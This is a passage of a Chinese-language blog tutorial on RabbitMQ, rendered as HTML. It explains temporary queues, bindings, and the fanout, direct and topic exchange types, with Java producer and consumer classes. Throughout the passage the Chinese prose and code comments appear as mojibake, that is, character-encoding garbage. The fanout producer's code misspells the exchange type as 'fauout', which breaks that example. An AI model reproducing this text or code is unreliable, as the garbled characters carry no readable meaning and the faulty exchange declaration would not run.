class="hljs-literal">null</span>,message.getBytes())ï¼›<br></code></pre></td></tr></table></figure></li></ol><h2 id="62-ä¸´æ—¶é˜Ÿåˆ—"><a class="markdownIt-Anchor" href="#62-ä¸´æ—¶é˜Ÿåˆ—"></a> 6.2 ä¸´æ—¶é˜Ÿåˆ—</h2><ol><li><p>æ¯å½“æˆ‘ä»¬è¿æ¥åˆ°Rabbitæ—¶ï¼Œæˆ‘ä»¬éƒ½éœ€è¦ä¸€ä¸ªå…¨æ–°çš„ç©ºé˜Ÿåˆ—ï¼Œä¸ºæ­¤æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªå…·æœ‰éšæœºåç§°çš„é˜Ÿåˆ—ï¼Œæˆ–è€…èƒ½è®©æœåŠ¡å™¨ä¸ºæˆ‘ä»¬é€‰æ‹©ä¸€ä¸ªéšæœºé˜Ÿåˆ—åç§°é‚£å°±æ›´å¥½äº†ã€‚å…¶æ¬¡ä¸€æ—¦æˆ‘ä»¬æ–­å¼€äº†æ¶ˆè´¹è€…çš„è¿æ¥ï¼Œé˜Ÿåˆ—å°†è¢«è‡ªåŠ¨åˆ é™¤ã€‚</p></li><li><p>åˆ›å»ºä¸´æ—¶é˜Ÿåˆ—çš„æ–¹å¼å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> channel.queueDeclare().getQueue();<br></code></pre></td></tr></table></figure><p>åˆ›å»ºå‡ºæ¥çš„é˜Ÿåˆ—é•¿è¿™æ ·ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112183805950.png" alt="image-20230112183805950" /></p></li></ol><h2 id="63-bindings"><a class="markdownIt-Anchor" href="#63-bindings"></a> 6.3 Bindings</h2><blockquote><p>ç®€ä»‹</p></blockquote><p>ä»€ä¹ˆæ˜¯bingding.å‘¢, bindingå…¶å®æ˜¯exchangeå’Œqueueä¹‹é—´çš„æ¡¥æ¢ï¼Œå®ƒå‘Šè¯‰æˆ‘ä»¬exchangeå’Œé‚£ä¸ªé˜Ÿåˆ—è¿›è¡Œäº†ç»‘å®šå…³ç³»ã€‚æ¯”å¦‚è¯´ä¸‹é¢è¿™å¼ å›¾å‘Šè¯‰æˆ‘ä»¬çš„å°±æ˜¯Ã—ä¸Q1å’ŒQ2è¿›è¡Œäº†ç»‘å®š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112183858070.png" alt="image-20230112183858070" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112183928963.png" alt="image-20230112183928963" /></p><p>ç»‘å®šæ˜¯äº¤æ¢æœºå’Œé˜Ÿåˆ—ä¹‹é—´çš„æ¡¥æ¢å…³ç³»ã€‚ä¹Ÿå¯ä»¥è¿™ä¹ˆç†è§£ï¼š</p><p><strong>é˜Ÿåˆ—åªå¯¹å®ƒç»‘å®šçš„äº¤æ¢æœºçš„æ¶ˆæ¯æ„Ÿå…´è¶£</strong>ã€‚ç»‘å®šç”¨å‚æ•°ï¼šroutingKey æ¥è¡¨ç¤ºä¹Ÿå¯ç§°è¯¥å‚æ•°ä¸º binding keyï¼Œåˆ›å»ºç»‘å®šæˆ‘ä»¬ç”¨ä»£ç :channel.queueBind(queueName, EXCHANGE_NAME, â€œroutingKeyâ€);<strong>ç»‘å®šä¹‹åçš„****æ„ä¹‰ç”±å…¶äº¤æ¢ç±»å‹å†³å®š</strong></p><h2 id="64-fanout"><a class="markdownIt-Anchor" href="#64-fanout"></a> 6.4 Fanout</h2><h3 id="ç®€ä»‹"><a class="markdownIt-Anchor" href="#ç®€ä»‹"></a> ç®€ä»‹</h3><p>Fanoutè¿™ç§ç±»å‹éå¸¸ç®€å•ã€‚æ­£å¦‚ä»åç§°ä¸­çŒœåˆ°çš„é‚£æ ·ï¼Œå®ƒæ˜¯å°†æ¥æ”¶åˆ°çš„æ‰€æœ‰æ¶ˆæ¯<strong>å¹¿æ’­</strong>åˆ°å®ƒçŸ¥é“çš„æ‰€æœ‰é˜Ÿåˆ—ä¸­ã€‚ç³»ç»Ÿä¸­é»˜è®¤æœ‰äº›exchangeç±»å‹</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112184017048.png" alt="image-20230112184017048" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112185237903.png" alt="image-20230112185237903" /></p><p>åœ¨å¹¿æ’­æ¨¡å¼ä¸‹ï¼Œæ¶ˆæ¯å‘é€æµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p><ul><li>1ï¼‰  å¯ä»¥æœ‰å¤šä¸ªé˜Ÿåˆ—</li><li>2ï¼‰  æ¯ä¸ªé˜Ÿåˆ—éƒ½è¦ç»‘å®šåˆ°Exchangeï¼ˆäº¤æ¢æœºï¼‰</li><li>3ï¼‰  ç”Ÿäº§è€…å‘é€çš„æ¶ˆæ¯ï¼Œåªèƒ½å‘é€åˆ°äº¤æ¢æœºï¼Œäº¤æ¢æœºæ¥å†³å®šè¦å‘ç»™å“ªä¸ªé˜Ÿåˆ—ï¼Œç”Ÿäº§è€…æ— æ³•å†³å®š</li><li>4ï¼‰  äº¤æ¢æœºæŠŠæ¶ˆæ¯å‘é€ç»™ç»‘å®šè¿‡çš„æ‰€æœ‰é˜Ÿåˆ—</li><li>5ï¼‰  è®¢é˜…é˜Ÿåˆ—çš„æ¶ˆè´¹è€…éƒ½èƒ½æ‹¿åˆ°æ¶ˆæ¯</li></ul><h3 id="å®æˆ˜"><a class="markdownIt-Anchor" href="#å®æˆ˜"></a> å®æˆ˜</h3><ol><li><p>æ¶ˆè´¹è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* æ¶ˆæ¯æ¥æ”¶</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReceiveLogs01</span> &#123;<br><br>    <span class="hljs-comment">//äº¤æ¢æœºåç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//å£°æ˜ä¸€ä¸ªé˜Ÿåˆ—,åç§°éšæœºï¼Œå½“æ¶ˆè´¹è€…æ–­å¼€ä¸é˜Ÿåˆ—çš„è¿æ¥æ—¶ï¼Œé˜Ÿåˆ—è‡ªåŠ¨åˆ é™¤</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> channel.queueDeclare().getQueue();<br><br>        <span class="hljs-comment">//ç»‘å®šäº¤æ¢æœºä¸é˜Ÿåˆ—</span><br>        channel.queueBind(queueName,EXCHANGE_NAME,<span class="hljs-string">&quot;&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;ç­‰å¾…æ¥å—æ¶ˆæ¯ï¼ŒæŠŠæ¥å—åˆ°çš„æ¶ˆæ¯æ‰“å°åœ¨å±å¹•ä¸Š...&quot;</span>);<br><br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;ReceiveLogs01æ§åˆ¶å°æ‰“å°æ¥å—åˆ°çš„æ¶ˆæ¯ï¼š&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br><br>        channel.basicConsume(queueName,<span class="hljs-literal">true</span>,deliverCallback,consumerTag -&gt; &#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* æ¶ˆæ¯æ¥æ”¶</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReceiveLogs02</span> &#123;<br><br>    <span class="hljs-comment">//äº¤æ¢æœºåç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//å£°æ˜ä¸€ä¸ªé˜Ÿåˆ—,åç§°éšæœºï¼Œå½“æ¶ˆè´¹è€…æ–­å¼€ä¸é˜Ÿåˆ—çš„è¿æ¥æ—¶ï¼Œé˜Ÿåˆ—è‡ªåŠ¨åˆ é™¤</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> channel.queueDeclare().getQueue();<br><br>        <span class="hljs-comment">//ç»‘å®šäº¤æ¢æœºä¸é˜Ÿåˆ—</span><br>        channel.queueBind(queueName,EXCHANGE_NAME,<span class="hljs-string">&quot;&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;ç­‰å¾…æ¥å—æ¶ˆæ¯ï¼ŒæŠŠæ¥å—åˆ°çš„æ¶ˆæ¯æ‰“å°åœ¨å±å¹•ä¸Š...&quot;</span>);<br><br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;ReceiveLogs02æ§åˆ¶å°æ‰“å°æ¥å—åˆ°çš„æ¶ˆæ¯ï¼š&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br><br>        channel.basicConsume(queueName,<span class="hljs-literal">true</span>,deliverCallback,consumerTag -&gt; &#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>ç”Ÿäº§è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">*  å‘æ¶ˆæ¯ äº¤æ¢æœº</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Emitlog</span> &#123;<br>    <span class="hljs-comment">// äº¤æ¢æœºçš„åç§°</span><br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span>  <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        channel.exchangeDeclare(EXCHANGE_NAME,<span class="hljs-string">&quot;fauout&quot;</span>);<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-keyword">while</span> (scanner.hasNext())&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> scanner.next();<br>            channel.basicPublish(EXCHANGE_NAME,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>            System.out.println(<span class="hljs-string">&quot;ç”Ÿäº§è€…å‘å‡ºçš„æ¶ˆæ¯ï¼š&quot;</span>+ message);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ•ˆæœ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112185021295.png" alt="image-20230112185021295" /></p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112185032271.png" alt="image-20230112185032271" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112185043636.png" alt="image-20230112185043636" /></p><h2 id="65-direct"><a class="markdownIt-Anchor" href="#65-direct"></a> 6.5 Direct</h2><blockquote><p>å®ç°åŸç†</p></blockquote><p>ä¸Šä¸€èŠ‚ä¸­çš„æˆ‘ä»¬çš„æ—¥å¿—ç³»ç»Ÿå°†æ‰€æœ‰æ¶ˆæ¯å¹¿æ’­ç»™æ‰€æœ‰æ¶ˆè´¹è€…ï¼Œå¯¹æ­¤æˆ‘ä»¬æƒ³åšä¸€äº›æ”¹å˜ï¼Œä¾‹å¦‚æˆ‘ä»¬å¸Œ</p><p>æœ›å°†æ—¥å¿—æ¶ˆæ¯å†™å…¥ç£ç›˜çš„ç¨‹åºä»…æ¥æ”¶ä¸¥é‡é”™è¯¯(errros)ï¼Œè€Œä¸å­˜å‚¨å“ªäº›è­¦å‘Š(warning)æˆ–ä¿¡æ¯(info)æ—¥å¿—</p><p>æ¶ˆæ¯é¿å…æµªè´¹ç£ç›˜ç©ºé—´ã€‚Fanout è¿™ç§äº¤æ¢ç±»å‹å¹¶ä¸èƒ½ç»™æˆ‘ä»¬å¸¦æ¥å¾ˆå¤§çš„çµæ´»æ€§-å®ƒåªèƒ½è¿›è¡Œæ— æ„è¯†çš„</p><p>å¹¿æ’­ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å°†ä½¿ç”¨ direct è¿™ç§ç±»å‹æ¥è¿›è¡Œæ›¿æ¢ï¼Œè¿™ç§ç±»å‹çš„å·¥ä½œæ–¹å¼æ˜¯ï¼Œæ¶ˆæ¯åªå»åˆ°å®ƒç»‘å®šçš„</p><p>routingKey é˜Ÿåˆ—ä¸­å»ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112191247694.png" alt="image-20230112191247694" /></p><p>åœ¨ä¸Šé¢è¿™å¼ å›¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° X ç»‘å®šäº†ä¸¤ä¸ªé˜Ÿåˆ—ï¼Œç»‘å®šç±»å‹æ˜¯ directã€‚é˜Ÿåˆ— Q1 ç»‘å®šé”®ä¸º orangeï¼Œé˜Ÿåˆ— Q2 ç»‘å®šé”®æœ‰ä¸¤ä¸ª:ä¸€ä¸ªç»‘å®šé”®ä¸º blackï¼Œå¦ä¸€ä¸ªç»‘å®šé”®ä¸º green.åœ¨è¿™ç§ç»‘å®šæƒ…å†µä¸‹ï¼Œç”Ÿäº§è€…å‘å¸ƒæ¶ˆæ¯åˆ° exchange ä¸Šï¼Œç»‘å®šé”®ä¸º orange çš„æ¶ˆæ¯ä¼šè¢«å‘å¸ƒåˆ°é˜Ÿåˆ—Q1ã€‚ç»‘å®šé”®ä¸º blackgreen å’Œçš„æ¶ˆæ¯ä¼šè¢«å‘å¸ƒåˆ°é˜Ÿåˆ— Q2ï¼Œå…¶ä»–æ¶ˆæ¯ç±»å‹çš„æ¶ˆæ¯å°†è¢«ä¸¢å¼ƒ</p><blockquote><p><strong>å¤šé‡ç»‘å®š</strong></p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112191413678.png" alt="image-20230112191413678" /></p><p>å½“ç„¶å¦‚æœ exchange çš„ç»‘å®šç±»å‹æ˜¯ directï¼Œ<strong>ä½†æ˜¯å®ƒç»‘å®šçš„å¤šä¸ªé˜Ÿåˆ—çš„</strong> <strong>key</strong> <strong>å¦‚æœéƒ½ç›¸åŒ</strong>ï¼Œåœ¨è¿™ç§æƒ…</p><p>å†µä¸‹è™½ç„¶ç»‘å®šç±»å‹æ˜¯ direct <strong>ä½†æ˜¯å®ƒè¡¨ç°çš„å°±å’Œ</strong> <strong>fanout</strong> <strong>æœ‰ç‚¹ç±»ä¼¼äº†</strong>ï¼Œå°±è·Ÿå¹¿æ’­å·®ä¸å¤šï¼Œå¦‚ä¸Šå›¾æ‰€ç¤º</p><blockquote><p>å®æˆ˜</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112191448686.png" alt="image-20230112191448686" /></p><ol><li><p>ç”Ÿäº§è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DirectLogs</span> &#123;<br>    <span class="hljs-comment">// äº¤æ¢æœºçš„åç§°</span><br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span>  <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;direct_logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.DIRECT);<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-keyword">while</span> (scanner.hasNext())&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> scanner.next();<br>            channel.basicPublish(EXCHANGE_NAME,<span class="hljs-string">&quot;info&quot;</span>,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>            System.out.println(<span class="hljs-string">&quot;ç”Ÿäº§è€…å‘å‡ºçš„æ¶ˆæ¯ï¼š&quot;</span>+ message);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ¶ˆè´¹è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReceiveLogsDirect01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;direct_logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//å£°æ˜ä¸€ä¸ªé˜Ÿåˆ—</span><br>        channel.queueDeclare(<span class="hljs-string">&quot;console&quot;</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//ç»‘å®šäº¤æ¢æœºä¸é˜Ÿåˆ—</span><br>        channel.queueBind(<span class="hljs-string">&quot;console&quot;</span>,EXCHANGE_NAME,<span class="hljs-string">&quot;info&quot;</span>);<br>        channel.queueBind(<span class="hljs-string">&quot;console&quot;</span>,EXCHANGE_NAME,<span class="hljs-string">&quot;warning&quot;</span>);<br><br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag, message) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;ReceiveLogsDirect01æ§åˆ¶å°æ‰“å°æ¥å—åˆ°çš„æ¶ˆæ¯ï¼š&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br><br>        channel.basicConsume(<span class="hljs-string">&quot;console&quot;</span>,<span class="hljs-literal">true</span>,deliverCallback,consumerTag -&gt; &#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReceiveLogsDirect02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;direct_logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//å£°æ˜ä¸€ä¸ªé˜Ÿåˆ—</span><br>        channel.queueDeclare(<span class="hljs-string">&quot;disk&quot;</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//ç»‘å®šäº¤æ¢æœºä¸é˜Ÿåˆ—</span><br>        channel.queueBind(<span class="hljs-string">&quot;disk&quot;</span>,EXCHANGE_NAME,<span class="hljs-string">&quot;error&quot;</span>);<br><br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag, message) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;ReceiveLogsDirect02æ§åˆ¶å°æ‰“å°æ¥å—åˆ°çš„æ¶ˆæ¯ï¼š&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br><br>        channel.basicConsume(<span class="hljs-string">&quot;disk&quot;</span>,<span class="hljs-literal">true</span>,deliverCallback,consumerTag -&gt; &#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ•ˆæœ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112192238926.png" alt="image-20230112192238926" /></p></li></ol><h2 id="66-topics"><a class="markdownIt-Anchor" href="#66-topics"></a> 6.6 Topics</h2><blockquote><p>ä»‹ç»</p></blockquote><ol><li>å‘é€åˆ°ç±»å‹æ˜¯topicäº¤æ¢æœºçš„æ¶ˆæ¯çš„routing_keyä¸èƒ½éšæ„å†™ï¼Œå¿…é¡»æ»¡è¶³ä¸€å®šçš„è¦æ±‚ï¼Œå®ƒ<code>å¿…é¡»æ˜¯ä¸€ä¸ªå•è¯åˆ—è¡¨ï¼Œä»¥ç‚¹å·åˆ†éš”å¼€</code>ã€‚è¿™äº›å•è¯å¯ä»¥æ˜¯ä»»æ„å•è¯ï¼Œæ¯”å¦‚è¯´: â€œstock.usd.nyseâ€ ï¼Œ â€œnyse.vmwâ€ï¼Œ&quot;quick.orange.rabbit&quot;è¿™ç§ç±»å‹çš„ã€‚å½“ç„¶è¿™ä¸ªå•è¯åˆ—è¡¨æœ€å¤šä¸èƒ½è¶…è¿‡255ä¸ªå­—èŠ‚ã€‚</li><li>åœ¨è¿™ä¸ªè§„åˆ™åˆ—è¡¨ä¸­ï¼Œå…¶ä¸­æœ‰ä¸¤ä¸ªæ›¿æ¢ç¬¦ï¼š<ul><li><code>*</code> å¯ä»¥ä»£æ›¿ä¸€ä¸ªå•è¯</li><li><code>#</code> å¯ä»¥ä»£æ›¿é›¶ä¸ªæˆ–å¤šä¸ªå•è¯</li></ul></li></ol><blockquote><p>åŒ¹é…æ¡ˆä¾‹</p></blockquote><p>ä¸‹å›¾ç»‘å®šå…³ç³»å¦‚ä¸‹ï¼š</p><p>Q1ç»‘å®šçš„æ˜¯ï¼šä¸­é—´å¸¦orangeçš„ä¸‰ä¸ªå•è¯çš„å­—ç¬¦ä¸²ï¼š<code>*.orange.*</code></p><p>Q2ç»‘å®šçš„æ˜¯ï¼šæœ€åä¸€ä¸ªå•è¯æ˜¯rabbitçš„å•ä¸ªå•è¯ï¼š<code>*.*.rabbit</code>ï¼Œç¬¬ä¸€ä¸ªå•è¯æ˜¯lazyçš„å¤šä¸ªå•è¯ï¼š<code>lazy.#</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112194339481.png" alt="image-20230112194339481" 